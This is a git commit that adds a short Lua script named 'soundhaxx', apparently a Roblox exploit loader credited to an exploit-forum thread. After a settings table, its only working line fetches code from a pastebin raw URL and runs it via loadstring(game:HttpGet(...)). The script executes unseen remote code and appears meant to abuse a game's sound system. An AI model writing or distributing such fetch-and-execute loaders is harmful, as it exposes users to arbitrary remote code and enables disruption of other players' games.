7946b3b793d172184fe6a976f68acb48569a5e9e
censor <86632275+cens6r@users.noreply.github.com>
2022-08-21 18:04:51 +0900

    Create soundhaxx.lua

---
+++ scripts/utils/soundhaxx.lua
@@ -0,0 +1,7 @@
+-- Credits: https://v3rmillion.net/showthread.php?tid=1184838
+
+_G.Settings = {
+   ["Notifications"] = true -- This will enable or disable notifications when something goes wrong
+}
+
+loadstring(game:HttpGet("https://pastebin.com/raw/VEVdaVdf"))()
